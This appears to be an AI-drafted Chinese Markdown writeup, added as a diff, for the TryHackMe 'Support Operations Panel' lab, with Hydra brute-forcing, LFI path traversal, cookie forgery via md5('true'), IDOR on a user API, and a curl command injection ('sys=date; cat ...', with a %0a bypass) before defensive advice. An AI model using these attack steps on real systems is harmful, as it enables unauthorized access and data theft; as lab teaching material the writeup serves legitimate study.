@@ -1,0 +1,122 @@
+写 GitHub 的 Writeup 确实需要更详细的步骤、思路分析和具体的命令，方便别人复现。我为你整理了一份详细、结构化、且带有原理解析的 Writeup，你可以直接复制到 GitHub 的 Markdown 文件里。
+
+---
+
+# TryHackMe - Support Operations Panel Writeup (详细通关记录)
+
+## 靶场信息
+*   **名称**: Support Operations Panel
+*   **目标 IP**: `10.48.186.*` (请根据自己实际环境替换)
+*   **考点**: 暴力破解 (Hydra)、本地文件包含 (LFI)、越权访问 (IDOR)、Cookie 伪造、命令注入 (Command Injection)。
+
+---
+
+## 攻击路径总览
+1.  利用已知账号 `help@support.thm` 进行**密码爆破**进入系统。
+2.  利用 `dashboard.php?skin=` 参数触发**本地文件包含 (LFI)** 读取配置文件，获取主密码。
+3.  修改 `isITUser` **Cookie 伪造管理员权限**，解锁 IT Panel。
+4.  利用 API 接口 **IDOR 越权**读取 ID 为 1 的管理员账号信息。
+5.  对主密码进行变形爆破，获取**真实管理员密码并登录**。
+6.  由于页面不渲染输入框，直接发送 **POST 请求进行命令注入** 获取 Flag。
+
+---
+
+## 详细步骤
+
+### 1. 密码爆破，获取初始立足点
+进入登录页面 `http://10.48.186.*/`，页面上提示了 IT 联系邮箱 `help@support.thm`。
+尝试用空密码或弱口令直接登录失败后，使用 Kali 自带的 Hydra 进行密码爆破。
+使用 SecLists 中最常见的密码字典：
+
+```bash
+hydra -l 'help@support.thm' \
+  -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
+  10.48.186.* \
+  http-post-form '/:email=^USER^&password=^PASS^:Invalid credentials'
+```
+**结果**：爆破出密码为 `helpme`（或者其他字典命中密码）。登录成功后进入 `dashboard.php`。
+
+### 2. LFI 读取源码，获取主密码
+登录后发现 URL 存在 `?skin=red` 等参数，猜测存在本地文件包含漏洞。
+利用路径穿越读取 `config.php` 源码，需要加上 `.php` 后缀：
+
+```
+http://10.48.186.*/dashboard.php?skin=../config
+```
+查看页面源代码，在返回的源码中发现主密码配置：
+```php
+$MASTER_PASSWORD = 'support@110';
+```
+
+### 3. 修改 Cookie，伪造 IT 管理员权限
+查看页面源码（或读取 `index.php`）发现权限验证逻辑：
+```php
+setcookie('isITUser', $user['admin'] ? md5("true") : md5("false"), ...);
+```
+这说明只要 Cookie 中 `isITUser` 的值等于 `md5("true")`，前端就会认为你是 IT 管理员。
+*   `md5("true")` 的值为：`b326b5062b2f0e69046810717534cb09`
+
+**操作**：
+1. 按 `F12` 打开开发者工具，进入 **Application (应用)** -> **Cookies**。
+2. 找到 `isITUser`，将值改为 `b326b5062b2f0e69046810717534cb09`。
+3. 刷新页面，页面出现了绿色的 **IT Admin Panel**。
+
+### 4. IDOR 越权获取管理员邮箱
+点击 "View API" 按钮，页面提示了 API 路由格式为 `/user/3`（当前用户）。
+由于是 IT 管理员，直接修改 URL 枚举用户：
+
+```
+http://10.48.186.*/user/1
+```
+页面返回了 JSON 数据：
+```json
+{
+  "email": "specialadmin@support.thm",
+  "2FA": false,
+  "admin": true
+}
+```
+成功获取最高管理员的邮箱：`specialadmin@support.thm`。
+
+### 5. 变形爆破，获取管理员真实密码
+尝试直接用主密码 `support@110` 登录管理员账号失败。推测密码进行过简单变形，去掉 `@` 符号。
+尝试密码：`support110`。使用该密码成功登录管理员账号。
+
+### 6. 命令注入 (Command Injection) 获取 Flag
+登录后，发现页面上并没有直接显示“系统诊断”的输入框。但通过之前的方法，可以读取到 `footer.php` 的源码，发现了其中的隐藏逻辑：
+
+```php
+$isAdmin = $_SESSION['admin'];
+if ($isAdmin && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sys'])) {
+    $selectedSys = $_POST['sys'];
+    $sys = $_POST['sys'];
+    // 检查是否以 'date' 开头
+    if (strpos($sys, 'date') === 0) {
+        $output = shell_exec($sys);
+    } else {
+        $error = 'Only date command is allowed.';
+    }
+}
+```
+**利用原理**：代码限制参数必须以 `date` 开头，且只接受 `POST` 请求。由于页面不显示输入框，我们需要手动构造 POST 请求。
+
+*先获取真实管理员的 `PHPSESSID`（在 F12 的 Application 中查看）。*
+
+**使用 curl 发送 POST 命令注入**：
+```bash
+curl -s -X POST http://10.48.186.*/dashboard.php \
+  -H "Cookie: PHPSESSID=你的真实管理员Session值" \
+  -d "sys=date; cat /home/ubuntu/user.txt"
+```
+*如果提示 `Only date command is allowed.`，说明分号被过滤，或者前端有校验，请尝试使用 `%0a` (换行符) 进行绕过。*
+
+**命令执行成功**，直接回显了最终的 Flag。
+
+---
+
+## 总结与防御建议
+*   **弱口令**：禁止用户使用常见弱密码。
+*   **LFI**：严格过滤用户输入的路径参数，禁止 `../` 等字符。
+*   **Cookie 伪造**：不要使用客户端可控的 Cookie 来决定权限，权限应存储在服务端 Session 中。
+*   **IDOR**：API 接口在查询数据时，必须校验当前用户是否有权限查看目标 ID 的数据。
+*   **命令注入**：尽量避免使用 `shell_exec` 等危险函数，如果必须使用，请使用 `escapeshellarg()` 进行严格过滤。
